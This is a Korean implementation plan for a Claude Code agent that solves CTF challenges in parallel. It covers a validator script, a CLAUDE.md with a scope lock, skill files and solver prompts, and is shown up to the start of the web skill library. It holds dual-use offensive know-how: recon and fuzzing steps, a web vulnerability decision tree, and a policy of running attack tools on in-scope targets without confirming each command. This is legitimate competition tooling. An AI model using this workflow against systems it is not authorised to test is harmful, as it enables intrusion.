# CTF/워게임 자동 풀이 에이전트 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Claude Code 네이티브 구성(CLAUDE.md + commands + agents + skills)으로, 대회 중 여러 웹/기타 카테고리 문제를 병렬 자동 풀이하고 플래그·writeup을 산출하는 에이전트를 구축한다.

**Architecture:** 오케스트레이터(`/ctf` + CLAUDE.md)가 문제를 분류·보드 등록 후 문제당 카테고리 서브에이전트를 병렬 spawn한다. 서브에이전트는 공유 스킬 라이브러리에서 기법을 로드하고 예산 제한·자기비평·증거타입 로그로 풀이하며, meta 스킬(triage/flag-hunt/writeup/tool-check)이 오케스트레이션 뼈대를 이룬다.

**Tech Stack:** Markdown 프롬프트 아티팩트(YAML frontmatter), 검증용 Python 3(표준 라이브러리만), git, CTF CLI 툴(sqlmap/ffuf/nmap/pwntools 등 — 런타임 의존, 빌드 시 불필요).

## Global Constraints

- 산출물은 코드가 아니라 **프롬프트 아티팩트**다. "테스트"는 `tools/validate.py`의 구조 검증(파일 존재 + frontmatter + 필수 H2 앵커) 통과로 정의한다. 로직 테스트는 최종 통합 리허설(Task 12).
- 모든 스킬 파일 경로: `.claude/skills/<category>/<slug>/SKILL.md`. `<category>` ∈ {web, pwn, rev, crypto, forensic, misc, meta}.
- 모든 서브에이전트: `.claude/agents/<name>.md`, frontmatter 키 `name`, `description`, `tools` 필수(`model` 선택).
- 모든 커맨드: `.claude/commands/<name>.md`, frontmatter 키 `description` 필수(`argument-hint` 선택).
- **표준 스킬 H2 앵커(정확히 이 5개, 영문)**: `## When`, `## Tools`, `## Procedure`, `## PoC`, `## Pitfalls`. 본문 내용은 한국어.
- **표준 solver H2 앵커**: `## Budget`, `## Skills`, `## Protocol`, `## Return`. (web-solver는 추가로 `## Recon Checklist`, `## Vuln Tree`.)
- **CLAUDE.md 필수 H2 앵커**: `## Competition Protocol`, `## Scope Lock`, `## Flag Rules`, `## Workflow`.
- 예산 기본값: web solver = 12 라운드, 기타 solver = 8 라운드. 자기비평 체크포인트 = 50% / 80%. critic 개입 = 연속 3회 실패.
- 증거타입 태그(정확히): `[OBS]`, `[HYP]`, `[POC]`, `[FLAG]`.
- 플래그 기본 정규식(다중): `FLAG\{.*?\}`, `DH\{.*?\}`, `[a-zA-Z0-9_]+\{.*?\}`.
- 각 태스크 종료 시 커밋. 커밋 메시지 말미:
  `Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>`
- `board/scope.md`, `board/challenges.md`, `board/writeups/`는 런타임 상태이므로 초기 템플릿만 커밋하고 `.gitignore`로 이후 변경 무시(§Task 3).

---

## File Structure

| 경로 | 책임 |
|---|---|
| `tools/validate.py` | 구조 검증 하네스(모든 아티팩트의 존재·frontmatter·앵커 확인) |
| `.gitignore` | board 런타임 상태 무시 |
| `CLAUDE.md` | 에이전트 헌법: 대회 프로토콜·스코프 락·플래그 규칙·워크플로 |
| `board/scope.md` | 인가 타겟 + 플래그 정규식 설정(런타임) |
| `board/challenges.md` | 문제 보드 표(런타임) |
| `board/writeups/.gitkeep` | writeup 출력 디렉토리 |
| `board/README.md` | board 사용법(커밋됨) |
| `.claude/skills/meta/triage-classify/SKILL.md` | 카테고리 분류 |
| `.claude/skills/meta/flag-hunt/SKILL.md` | 플래그 추출·검증·기록 |
| `.claude/skills/meta/writeup-generate/SKILL.md` | writeup 생성 |
| `.claude/skills/meta/tool-check/SKILL.md` | CTF 툴 설치 점검 |
| `.claude/commands/ctf.md` | `/ctf` 메인 진입 |
| `.claude/commands/ctf-board.md` | `/ctf-board` 현황판 |
| `.claude/commands/ctf-web.md` | `/ctf-web` 웹솔버 직접 |
| `.claude/commands/ctf-writeup.md` | `/ctf-writeup` 재생성 |
| `.claude/commands/ctf-setup.md` | `/ctf-setup` 툴 세팅 |
| `.claude/agents/web-solver.md` | 웹 서브에이전트(최대 깊이) |
| `.claude/agents/{pwn,rev,crypto,forensic,misc}-solver.md` | 카테고리 서브에이전트 |
| `.claude/skills/web/<slug>/SKILL.md` × 13 | 웹 기법 라이브러리 |
| `.claude/skills/{pwn,rev,crypto,forensic,misc}/<slug>/SKILL.md` | 기타 기법 |

---

## Task 1: 검증 하네스 + 리포 골격

**Files:**
- Create: `tools/validate.py`
- Create: `.gitignore`

**Interfaces:**
- Produces: CLI `python3 tools/validate.py [PATH ...]` — 인자 없으면 알려진 디렉토리 전체 검증. 각 PATH를 위치로 타입 판별 후 규칙 검증. 누락·위반 시 stderr에 `FAIL <path>: <이유>` 출력하고 exit 1. 전부 통과 시 `OK (<n> files)` 출력 후 exit 0. 존재하지 않는 명시 경로도 FAIL.

- [ ] **Step 1: 검증 하네스 작성 (실패 테스트 역할)**

`tools/validate.py`:
```python
#!/usr/bin/env python3
"""CTF 에이전트 아티팩트 구조 검증기 (표준 라이브러리만 사용)."""
import sys, re, glob, os

FRONTMATTER = re.compile(r"^---\n(.*?)\n---\n", re.S)

def parse_front(text):
    m = FRONTMATTER.match(text)
    if not m:
        return None
    keys = {}
    for line in m.group(1).splitlines():
        if ":" in line and not line.startswith(" "):
            k = line.split(":", 1)[0].strip()
            keys[k] = line.split(":", 1)[1].strip()
    return keys

def has_anchors(text, anchors):
    return [a for a in anchors if not re.search(r"^%s\s*$" % re.escape(a), text, re.M)]

SKILL_ANCHORS = ["## When", "## Tools", "## Procedure", "## PoC", "## Pitfalls"]
SOLVER_ANCHORS = ["## Budget", "## Skills", "## Protocol", "## Return"]
WEB_SOLVER_EXTRA = ["## Recon Checklist", "## Vuln Tree"]
CLAUDE_ANCHORS = ["## Competition Protocol", "## Scope Lock", "## Flag Rules", "## Workflow"]

def validate_file(path):
    """리스트(에러문자열) 반환. 빈 리스트면 통과."""
    if not os.path.isfile(path):
        return ["missing file"]
    text = open(path, encoding="utf-8").read()
    errs = []
    norm = path.replace("\\", "/")
    if norm.endswith("/SKILL.md") or "/skills/" in norm:
        fm = parse_front(text)
        if fm is None: errs.append("no frontmatter")
        else:
            for k in ("name", "description"):
                if k not in fm: errs.append("frontmatter missing '%s'" % k)
        errs += ["missing anchor '%s'" % a for a in has_anchors(text, SKILL_ANCHORS)]
    elif "/agents/" in norm:
        fm = parse_front(text)
        if fm is None: errs.append("no frontmatter")
        else:
            for k in ("name", "description", "tools"):
                if k not in fm: errs.append("frontmatter missing '%s'" % k)
        anchors = SOLVER_ANCHORS + (WEB_SOLVER_EXTRA if norm.endswith("web-solver.md") else [])
        errs += ["missing anchor '%s'" % a for a in has_anchors(text, anchors)]
    elif "/commands/" in norm:
        fm = parse_front(text)
        if fm is None or "description" not in (fm or {}):
            errs.append("frontmatter missing 'description'")
    elif norm.endswith("CLAUDE.md"):
        errs += ["missing anchor '%s'" % a for a in has_anchors(text, CLAUDE_ANCHORS)]
    return errs

def targets(args):
    if args:
        return args
    found = ["CLAUDE.md"]
    for pat in (".claude/skills/**/SKILL.md", ".claude/agents/*.md", ".claude/commands/*.md"):
        found += glob.glob(pat, recursive=True)
    return found

def main():
    paths = targets(sys.argv[1:])
    failed = False
    for p in paths:
        errs = validate_file(p)
        if errs:
            failed = True
            for e in errs:
                sys.stderr.write("FAIL %s: %s\n" % (p, e))
    if failed:
        sys.exit(1)
    print("OK (%d files)" % len(paths))

if __name__ == "__main__":
    main()
```

- [ ] **Step 2: 실패 확인**

Run: `python3 tools/validate.py CLAUDE.md`
Expected: `FAIL CLAUDE.md: missing file` (still exit 1) — 하네스 자체는 동작, 대상 미존재.

- [ ] **Step 3: .gitignore 작성**

`.gitignore`:
```
board/scope.md
board/challenges.md
board/writeups/*
!board/writeups/.gitkeep
```

- [ ] **Step 4: 하네스 자체 동작 확인**

Run: `python3 tools/validate.py`
Expected: `OK (1 files)` — 현재 존재 파일이 없어 glob이 비고 CLAUDE.md만 대상이나 없음 → 실제로는 `FAIL ... missing file`. 이때는 **의도된 fail**. 아직 CLAUDE.md가 없으므로 exit 1이 정상. Task 2에서 해소.

- [ ] **Step 5: 커밋**

```bash
git add tools/validate.py .gitignore
git commit -m "Add artifact validation harness and gitignore

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 2: CLAUDE.md (에이전트 헌법)

**Files:**
- Create: `CLAUDE.md`
- Test: `python3 tools/validate.py CLAUDE.md`

**Interfaces:**
- Produces: 4개 필수 앵커(`## Competition Protocol`, `## Scope Lock`, `## Flag Rules`, `## Workflow`) 포함 문서. 모든 서브에이전트·커맨드가 참조하는 전역 규칙.

- [ ] **Step 1: 검증 먼저 실행 (실패 확인)**

Run: `python3 tools/validate.py CLAUDE.md`
Expected: `FAIL CLAUDE.md: missing file`

- [ ] **Step 2: CLAUDE.md 작성**

```markdown
# CTF 자동 풀이 에이전트

이 리포는 CTF/워게임 대회 중 여러 문제를 병렬 자동 풀이하는 Claude Code 에이전트다.
자동 풀이형: 정찰→익스→플래그→writeup을 최소 개입으로 수행한다.

## Competition Protocol

- 문제 입력은 URL / 로컬 파일 / 지문 텍스트 / 붙여넣기(복수 가능).
- 처리 순서: (1) `meta/triage-classify`로 분류 → (2) `board/challenges.md` 등록(todo)
  → (3) 문제당 카테고리 서브에이전트 병렬 spawn → (4) 결과 수집 →
  (5) `meta/flag-hunt` 검증·기록 → (6) `meta/writeup-generate` 산출 → (7) 보드 갱신.
- 문제가 1개면 동기 실행, 2개 이상이면 병렬(백그라운드 서브에이전트).
- 서브에이전트 결과는 표준 스키마(§Return in each solver)로만 받는다.

## Scope Lock

- 능동 공격 툴(sqlmap/ffuf/nmap/curl 페이로드 등)은 `board/scope.md`의 In-Scope 목록에
  포함된 호스트/도메인/포트/파일에만 실행한다.
- 스코프 내 타겟에는 **매 명령 확인 없이 자유 실행**(사용자 요청 사항).
- 스코프에 없는 호스트로의 능동 공격이 필요하면 실행하지 말고 `needs-scope` 상태로
  오케스트레이터에 보고한다. 사용자가 `board/scope.md`에 추가하면 즉시 허용.
- 이 규칙은 오발·법적 사고 방지용이며 사용자의 자유 실행 선택과 상충하지 않는다
  (스코프 안에서는 프롬프트 없음).

## Flag Rules

- 플래그 정규식은 `board/scope.md`의 Flag-Format 설정에서 읽는다.
- 기본값(대회 미설정 시): `FLAG\{.*?\}`, `DH\{.*?\}`, `[a-zA-Z0-9_]+\{.*?\}`.
- 툴 출력·서브에이전트 로그를 스캔해 후보를 추출하고, 형식 검증 후 보드에 기록한다.

## Workflow

증거타입 로그를 항상 남긴다: `[OBS]` 관찰 / `[HYP]` 가설 / `[POC]` 개념증명 / `[FLAG]` 확정.
서브에이전트는 예산(web=12, 기타=8 라운드) 안에서 풀고, 50%/80% 지점에서 자기비평한다.
한 문제에서 연속 3회 실패 보고 시 오케스트레이터가 재분류하거나 대체 기법을 지시한다.
막히면 억지로 진행하지 말고 `stuck`/`needs-user`/`needs-scope`로 정직하게 반환한다.
```

- [ ] **Step 3: 검증 통과 확인**

Run: `python3 tools/validate.py CLAUDE.md`
Expected: `OK (1 files)`

- [ ] **Step 4: 커밋**

```bash
git add CLAUDE.md
git commit -m "Add agent constitution (CLAUDE.md)

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 3: board/ 초기 템플릿

**Files:**
- Create: `board/scope.md`
- Create: `board/challenges.md`
- Create: `board/writeups/.gitkeep`
- Create: `board/README.md`

**Interfaces:**
- Produces: 런타임 상태 파일 3종의 초기 템플릿 + 커밋되는 사용법 문서. `scope.md`는 Flag-Format·In-Scope 설정을 담아 CLAUDE.md와 meta 스킬이 파싱.

- [ ] **Step 1: board/scope.md 작성**

```markdown
# 대회 스코프 & 설정

## Flag-Format
FLAG\{.*?\}
DH\{.*?\}
[a-zA-Z0-9_]+\{.*?\}

## In-Scope
# 대회 시작 시 인가된 타겟을 한 줄에 하나씩 추가. 예:
# https://chal.example.ctf
# 10.10.10.5:31337
# ./challenges/ez-sqli/
```

- [ ] **Step 2: board/challenges.md 작성**

```markdown
# 문제 보드

| # | 문제 | 카테고리 | 점수 | 상태 | 플래그 | 갱신 |
|---|------|---------|------|------|--------|------|
```

- [ ] **Step 3: writeups/.gitkeep + board/README.md 작성**

`board/writeups/.gitkeep`: 빈 파일.

`board/README.md`:
```markdown
# board/

대회 실시간 상태. 이 안의 `scope.md`/`challenges.md`/`writeups/`는 런타임에 갱신되며
`.gitignore`로 커밋에서 제외된다(템플릿만 최초 커밋).

- `scope.md` — 인가 타겟(In-Scope) + 플래그 정규식(Flag-Format). 대회 시작 시 채운다.
- `challenges.md` — 문제 상태 표. 상태: todo → solving → solved / stuck / needs-scope / needs-user.
- `writeups/` — 문제별 `<challenge>.md` 산출물.
```

- [ ] **Step 4: 커밋** (gitignore로 상태 파일은 빠지고 .gitkeep/README만 커밋됨)

```bash
git add -f board/writeups/.gitkeep board/README.md
git add board/scope.md board/challenges.md 2>/dev/null; git status --short
git commit -m "Add board templates and runtime-state docs

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```
Expected: `board/README.md`, `board/writeups/.gitkeep`만 커밋(나머지는 ignore).

---

## Task 4: meta 스킬 4종 (오케스트레이션 엔진)

**Files:**
- Create: `.claude/skills/meta/triage-classify/SKILL.md`
- Create: `.claude/skills/meta/flag-hunt/SKILL.md`
- Create: `.claude/skills/meta/writeup-generate/SKILL.md`
- Create: `.claude/skills/meta/tool-check/SKILL.md`
- Test: `python3 tools/validate.py .claude/skills/meta/*/SKILL.md`

**Interfaces:**
- Consumes: Task 1 검증 하네스, Task 2 CLAUDE.md 규칙.
- Produces: 4개 meta 스킬. 표준 5앵커(`## When/Tools/Procedure/PoC/Pitfalls`) 준수.

- [ ] **Step 1: 검증 먼저 (실패 확인)**

Run: `python3 tools/validate.py .claude/skills/meta/triage-classify/SKILL.md`
Expected: `FAIL ...: missing file`

- [ ] **Step 2: triage-classify/SKILL.md 작성**

```markdown
---
name: triage-classify
description: CTF 문제 입력을 카테고리(web/pwn/rev/crypto/forensic/misc)로 분류하고 신뢰도를 매긴다
---
## When
새 문제가 들어와 어느 solver로 보낼지 정해야 할 때. `/ctf`가 최초로 호출한다.

## Tools
`file`, `binwalk`, `strings`, `curl -I`(스코프 내). 입력이 URL/파일/텍스트인지에 따라 선택.

## Procedure
1. 입력 형태 판별: URL → 웹 우선. 파일 → `file`로 타입 확인. 텍스트 → 키워드/패턴.
2. 신호 매핑:
   - web: http(s) URL, HTML/JS, 쿠키/JWT, 로그인 폼, GraphQL 엔드포인트.
   - pwn: ELF/PE 실행파일, `nc host port`, libc 첨부.
   - rev: 실행파일인데 네트워크 없음, 난독화 스크립트, .apk/.class.
   - crypto: RSA/AES 언급, 키·암호문·nonce, 인코딩 덩어리.
   - forensic: .pcap, 메모리 덤프, 이미지/오디오(stego), 디스크 이미지.
   - misc: 그 외(인코딩 퍼즐, jail, esolang).
3. 각 문제에 `category` + `confidence(high/med/low)` 부여.
4. `board/challenges.md`에 행 추가(상태 todo). 애매하면 상위 2개 후보를 기록.

## PoC
`file ./chal` → `ELF 64-bit` ⇒ pwn/rev 후보. `curl -sI $URL | grep -i server` ⇒ web 스택 단서.

## Pitfalls
겉보기 web이 실제로 crypto(JWT 약한 서명)일 수 있음 → confidence low면 solver에 대체 후보를 함께 전달.
```

- [ ] **Step 3: flag-hunt/SKILL.md 작성**

```markdown
---
name: flag-hunt
description: 툴 출력과 solver 로그에서 플래그를 추출·형식검증하고 보드에 기록한다
---
## When
solver가 결과를 반환했을 때, 또는 임의 툴 출력에서 플래그를 확인해야 할 때.

## Tools
`grep -Eo`, ripgrep. 정규식은 `board/scope.md`의 Flag-Format에서 읽음.

## Procedure
1. `board/scope.md`의 `## Flag-Format` 아래 각 줄을 정규식으로 로드(없으면 기본값 3종).
2. 대상 텍스트에 각 정규식 매칭 → 후보 수집(중복 제거).
3. 후보가 여러 개면 문제 문맥(형식·길이)로 가장 그럴듯한 것 선택, 나머지는 로그에 남김.
4. `board/challenges.md`의 해당 문제 행에 플래그 + ISO8601 타임스탬프 기록, 상태 solved.

## PoC
`grep -Eo 'FLAG\{.*?\}|DH\{.*?\}' output.txt | sort -u`

## Pitfalls
디코이 플래그·플래그 형식의 예시 문자열 주의. 확정 전 `[FLAG]` 태그로 근거(어디서 나왔는지) 남길 것.
```

- [ ] **Step 4: writeup-generate/SKILL.md 작성**

```markdown
---
name: writeup-generate
description: 증거타입 로그와 플래그로 문제별 writeup 마크다운을 생성한다
---
## When
문제가 solved 되어 재현 가능한 기록을 남길 때. `/ctf` 말미와 `/ctf-writeup`이 호출.

## Tools
없음(로그·플래그 텍스트만 사용).

## Procedure
1. solver의 증거타입 로그(`[OBS]/[HYP]/[POC]/[FLAG]`)와 사용 스킬 목록 수집.
2. 다음 구조로 `board/writeups/<challenge>.md` 작성:
   - 제목/카테고리/점수
   - 정찰: `[OBS]` 요약
   - 취약점: `[HYP]`에서 확정된 근본 원인
   - 익스플로잇: `[POC]`의 재현 명령/페이로드(그대로 실행 가능하게)
   - 플래그: `[FLAG]`
   - 회고: 막혔던 지점·대체 기법
3. 파일 경로를 결과 스키마 `writeup_path`에 반환.

## PoC
파일명은 문제명을 슬러그화(`공백→-`, 소문자). 예: `ez sqli` → `board/writeups/ez-sqli.md`.

## Pitfalls
재현 명령에 실제 타겟 호스트가 들어가면 스코프 내 값인지 확인. 비어있는 섹션은 생략하지 말고 "해당 없음" 명시.
```

- [ ] **Step 5: tool-check/SKILL.md 작성**

```markdown
---
name: tool-check
description: CTF 풀이에 필요한 CLI 툴 설치 여부를 점검하고 누락분 설치를 안내·실행한다
---
## When
`/ctf-setup` 실행 시, 또는 solver가 특정 툴을 쓰기 직전 존재를 확인할 때.

## Tools
`command -v`, `brew`(darwin), `pipx`/`pip`.

## Procedure
1. 카테고리별 핵심 툴 목록을 점검:
   - web: `curl`, `ffuf`, `sqlmap`, `nmap`, `jq`, `nikto`
   - pwn: `python3`(pwntools), `gdb`, `checksec`, `ropper`, `one_gadget`
   - rev: `radare2`/`rizin`, `ghidra`(선택), `strings`, `binwalk`
   - crypto: `python3`(pycryptodome, sympy), `openssl`
   - forensic: `wireshark`/`tshark`, `volatility3`, `exiftool`, `steghide`, `foremost`
2. `command -v <tool>`로 존재 확인 → 없으면 설치 명령 제시(darwin: `brew install`, python: `pipx install`).
3. 자유 실행 정책에 따라 설치를 바로 수행하되, 시스템 변경이 큰 항목은 사용자에게 알림.

## PoC
`for t in ffuf sqlmap nmap jq; do command -v $t >/dev/null && echo "ok $t" || echo "MISSING $t"; done`

## Pitfalls
pwntools/volatility는 venv/pipx 권장(전역 오염 방지). GUI 툴(ghidra/wireshark)은 필수 아님으로 표시.
```

- [ ] **Step 6: 검증 통과 확인**

Run: `python3 tools/validate.py .claude/skills/meta/*/SKILL.md`
Expected: `OK (4 files)`

- [ ] **Step 7: 커밋**

```bash
git add .claude/skills/meta
git commit -m "Add meta skills: triage, flag-hunt, writeup, tool-check

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 5: 슬래시 커맨드 5종

**Files:**
- Create: `.claude/commands/ctf.md`
- Create: `.claude/commands/ctf-board.md`
- Create: `.claude/commands/ctf-web.md`
- Create: `.claude/commands/ctf-writeup.md`
- Create: `.claude/commands/ctf-setup.md`
- Test: `python3 tools/validate.py .claude/commands/*.md`

**Interfaces:**
- Consumes: meta 스킬(Task 4), CLAUDE.md 규칙(Task 2), 서브에이전트 이름(Task 6/7 — `web-solver` 등).
- Produces: 5개 커맨드. frontmatter `description` 필수, `$ARGUMENTS` 사용.

- [ ] **Step 1: 검증 먼저 (실패 확인)**

Run: `python3 tools/validate.py .claude/commands/ctf.md`
Expected: `FAIL ...: missing file`

- [ ] **Step 2: ctf.md 작성**

```markdown
---
description: CTF 문제를 트리아지→분류→병렬 풀이하고 플래그와 writeup을 산출한다
argument-hint: <URL | 파일경로 | 문제 지문 (복수 가능)>
---
입력: $ARGUMENTS

CLAUDE.md의 Competition Protocol을 따른다:
1. `triage-classify` 스킬로 각 문제를 카테고리 분류하고 `board/challenges.md`에 등록(todo).
2. 문제가 2개 이상이면 문제당 해당 카테고리 서브에이전트(web-solver 등)를 병렬 spawn(백그라운드),
   1개면 동기 실행. 각 서브에이전트에 문제 식별자·입력·스코프를 전달.
3. 각 서브에이전트의 표준 결과 스키마를 수집한다.
4. `flag-hunt`로 플래그 검증·기록, `writeup-generate`로 writeup 생성, 보드 상태 갱신.
5. 최종 요약(문제별 상태·플래그·writeup 경로)을 표로 출력.

스코프: `board/scope.md`의 In-Scope에 없는 능동 공격은 실행하지 말고 needs-scope로 보고.
```

- [ ] **Step 3: ctf-board.md 작성**

```markdown
---
description: 현재 대회 보드(문제 상태·플래그·점수)를 출력한다
---
`board/challenges.md`를 읽어 그대로 표로 출력하고, 상태별 집계(solved/solving/stuck/todo)와
획득 점수 합계를 덧붙인다. 파일이 비어 있으면 "등록된 문제 없음"을 안내한다.
```

- [ ] **Step 4: ctf-web.md 작성**

```markdown
---
description: 트리아지를 건너뛰고 web-solver를 직접 호출한다
argument-hint: <타겟 URL 또는 파일>
---
입력: $ARGUMENTS

분류를 생략하고 web-solver 서브에이전트를 바로 호출한다. 타겟이 `board/scope.md` In-Scope에
없으면 먼저 추가할지 사용자에게 확인한다. 결과는 `/ctf`와 동일하게 flag-hunt→writeup으로 마감.
```

- [ ] **Step 5: ctf-writeup.md 작성**

```markdown
---
description: 지정한 문제의 writeup을 재생성한다
argument-hint: <문제명>
---
대상 문제: $ARGUMENTS

`board/challenges.md`에서 해당 문제의 상태·플래그를 찾고, 남아있는 증거타입 로그를 근거로
`writeup-generate` 스킬을 호출해 `board/writeups/<slug>.md`를 다시 만든다.
로그가 없으면 사용 가능한 정보로 최선의 writeup을 작성하고 부족한 부분을 명시한다.
```

- [ ] **Step 6: ctf-setup.md 작성**

```markdown
---
description: CTF 풀이 툴 설치 여부를 점검하고 누락분을 설치한다
---
`tool-check` 스킬을 실행해 카테고리별 핵심 툴 존재를 점검하고, 누락 툴의 설치 명령을 제시·실행한다.
darwin 환경 기준(brew/pipx). GUI 툴은 선택으로 표시한다.
```

- [ ] **Step 7: 검증 통과 확인**

Run: `python3 tools/validate.py .claude/commands/*.md`
Expected: `OK (5 files)`

- [ ] **Step 8: 커밋**

```bash
git add .claude/commands
git commit -m "Add slash commands: ctf, board, web, writeup, setup

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 6: 서브에이전트 공통 프로토콜 + web-solver

**Files:**
- Create: `.claude/agents/web-solver.md`
- Test: `python3 tools/validate.py .claude/agents/web-solver.md`

**Interfaces:**
- Consumes: CLAUDE.md 규칙, meta 스킬, web/ 스킬(Task 8 — 아직 없어도 참조 인덱스로 기재).
- Produces: web-solver 서브에이전트. frontmatter `name: web-solver`, `description`, `tools`. 앵커 `## Budget/Skills/Protocol/Return` + web 전용 `## Recon Checklist`, `## Vuln Tree`. 표준 Return 스키마는 이후 모든 solver가 동일 형식 사용.

- [ ] **Step 1: 검증 먼저 (실패 확인)**

Run: `python3 tools/validate.py .claude/agents/web-solver.md`
Expected: `FAIL ...: missing file`

- [ ] **Step 2: web-solver.md 작성**

```markdown
---
name: web-solver
description: 웹 취약점 CTF 문제를 정찰→분류→익스플로잇→플래그로 자동 풀이한다. 웹 카테고리 문제나 /ctf-web에서 사용.
tools: Bash, Read, Write, Edit, WebFetch, Grep, Glob
model: opus
---
너는 웹 해킹 CTF 전문 solver다. CLAUDE.md의 Scope Lock/Flag Rules/Workflow를 반드시 따른다.

## Budget
최대 12 라운드. 6라운드(50%)와 10라운드(80%)에서 자기비평:
"시도한 것 / 유효했던 신호 / 다음 가설". 12라운드 소진 시 stuck으로 반환(다음 가설 포함).
스코프 밖 타겟이 필요하면 즉시 needs-scope 반환.

## Recon Checklist
1. `curl -sI`로 헤더·서버·쿠키·리다이렉트 확인(스코프 내).
2. robots.txt, sitemap, 흔한 경로, `ffuf`로 디렉토리/파라미터 퍼징.
3. 페이지 소스·JS 번들에서 엔드포인트·주석·API 키·클라이언트 검증 로직 추출.
4. 인증 흐름(쿠키/JWT/세션)과 상태 변경 요청(POST/PUT) 목록화.
5. 입력 지점(쿼리/폼/헤더/파일업로드/GraphQL) 표로 정리 → `[OBS]`.

## Vuln Tree
입력 반사됨 → XSS(`xss`) / SSTI(`ssti`).
DB 오류·불린 차이 → SQLi(`sqli`).
서버가 URL을 가져옴 → SSRF(`ssrf`).
토큰이 JWT → JWT 공격(`jwt`).
파일 업로드 존재 → 업로드 RCE(`file-upload-rce`).
XML 파싱 → XXE(`xxe`).
객체 문자열 역직렬화 단서 → `deserialization`.
숫자 ID로 리소스 접근 → IDOR/권한우회(`idor-authbypass`).
경로/파일명 입력 → 경로 순회(`path-traversal`).
동시성/상태경쟁 단서 → `race-condition`.
GraphQL 엔드포인트 → `graphql`.

## Skills
`.claude/skills/web/` 아래 스킬을 신호에 맞춰 로드: recon-web, sqli, xss, ssrf, jwt,
file-upload-rce, xxe, deserialization, ssti, idor-authbypass, path-traversal, race-condition, graphql.
각 스킬의 `## When`으로 적용 여부 판단, `## Procedure`/`## PoC`로 실행, `## Pitfalls`로 우회.

## Protocol
매 관찰을 증거타입 태그로 로그: `[OBS]` 정찰 발견 / `[HYP]` 취약점 가설 /
`[POC]` 익스 성공 근거 / `[FLAG]` 확정 플래그. 스코프 내에서는 툴을 확인 없이 실행.
연속 3회 실패 시 그 사실을 반환에 담아 오케스트레이터의 critic 재분류를 유도.

## Return
아래 스키마로만 반환(YAML 블록):
challenge, category(=web), status(solved|stuck|needs-scope|needs-user),
flag(문자열|null), techniques(사용 스킬 목록), evidence(증거타입 로그 요약 배열),
next_steps(stuck시), writeup_path.
```

- [ ] **Step 3: 검증 통과 확인**

Run: `python3 tools/validate.py .claude/agents/web-solver.md`
Expected: `OK (1 files)`

- [ ] **Step 4: 커밋**

```bash
git add .claude/agents/web-solver.md
git commit -m "Add web-solver subagent with recon checklist and vuln tree

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 7: 기타 카테고리 서브에이전트 5종

**Files:**
- Create: `.claude/agents/pwn-solver.md`
- Create: `.claude/agents/rev-solver.md`
- Create: `.claude/agents/crypto-solver.md`
- Create: `.claude/agents/forensic-solver.md`
- Create: `.claude/agents/misc-solver.md`
- Test: `python3 tools/validate.py .claude/agents/{pwn,rev,crypto,forensic,misc}-solver.md`

**Interfaces:**
- Consumes: web-solver(Task 6)의 표준 `## Return` 스키마(동일 형식 재사용), 각 카테고리 스킬(Task 9).
- Produces: 5개 solver. 앵커 `## Budget/Skills/Protocol/Return`(web 전용 앵커 없음). 예산 8 라운드.

- [ ] **Step 1: 검증 먼저 (실패 확인)**

Run: `python3 tools/validate.py .claude/agents/pwn-solver.md`
Expected: `FAIL ...: missing file`

- [ ] **Step 2: 5개 solver 작성 (각 파일 아래 내용, `<CAT>`/`<TOOLS>`/`<SKILLS>`/`<APPROACH>`만 치환)**

공통 골격 (각 파일에 이 구조를 그대로 쓰되 치환값 채움):
```markdown
---
name: <CAT>-solver
description: <CAT> 카테고리 CTF 문제를 자동 풀이한다.
tools: Bash, Read, Write, Edit, Grep, Glob
model: opus
---
너는 <CAT> CTF 전문 solver다. CLAUDE.md의 Scope Lock/Flag Rules/Workflow를 따른다.

## Budget
최대 8 라운드. 4라운드(50%)·6.4라운드(80%)에서 자기비평(시도/유효신호/다음가설).
소진 시 stuck 반환. 스코프 밖 타겟 필요 시 needs-scope 반환.

## Skills
`.claude/skills/<CAT>/` 스킬을 신호에 맞춰 로드: <SKILLS>.
각 스킬의 When으로 적용 판단, Procedure/PoC로 실행.
<APPROACH>

## Protocol
증거타입 태그 로그(`[OBS]/[HYP]/[POC]/[FLAG]`). 스코프 내 툴 자유 실행.
연속 3회 실패 시 그 사실을 반환에 담아 critic 재분류 유도.

## Return
web-solver와 동일 스키마: challenge, category(=<CAT>), status, flag, techniques,
evidence, next_steps, writeup_path.
```

치환표:
| 파일 | `<CAT>` | `<SKILLS>` | `<APPROACH>`(1~2줄) |
|---|---|---|---|
| pwn-solver.md | pwn | recon-binary, rop-stack-overflow, format-string, heap-exploit | `checksec`로 보호기법 확인 → 오버플로/포맷스트링/힙 순으로 취약점 후보. pwntools로 익스 스크립트 작성, 로컬 재현 후 원격(스코프 내) 적용. |
| rev-solver.md | rev | static-triage, dynamic-analysis, deobfuscation | 먼저 정적 트리아지(strings/디컴파일)로 로직 파악 → 필요 시 동적 분석(gdb/디버거)·역난독화. 플래그 검증 루틴을 찾아 역산. |
| crypto-solver.md | crypto | rsa-attacks, aes-mode-attacks, hash-length-ext, classical-encoding | 암호계·파라미터 식별 → 알려진 취약(작은 e, 공통 모듈러스, ECB, nonce 재사용) 매칭. sympy/pycryptodome로 공격 스크립트. |
| forensic-solver.md | forensic | pcap-analysis, memory-forensics, stego, disk-file-carving | 아티팩트 종류 판별(pcap/메모리/이미지/디스크) → 해당 도구체인으로 추출. 숨겨진 플래그를 계층적으로 탐색. |
| misc-solver.md | misc | encoding-decoding, jail-escape | 인코딩/난독 해제 우선, jail이면 필터 분석 후 우회 페이로드 구성. |

- [ ] **Step 3: 검증 통과 확인**

Run: `python3 tools/validate.py .claude/agents/*.md`
Expected: `OK (6 files)` (web 포함)

- [ ] **Step 4: 커밋**

```bash
git add .claude/agents
git commit -m "Add pwn/rev/crypto/forensic/misc solver subagents

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 8: 웹 스킬 라이브러리 (13종)

**Files:**
- Create: `.claude/skills/web/<slug>/SKILL.md` × 13
- Test: `python3 tools/validate.py .claude/skills/web/*/SKILL.md`

**Interfaces:**
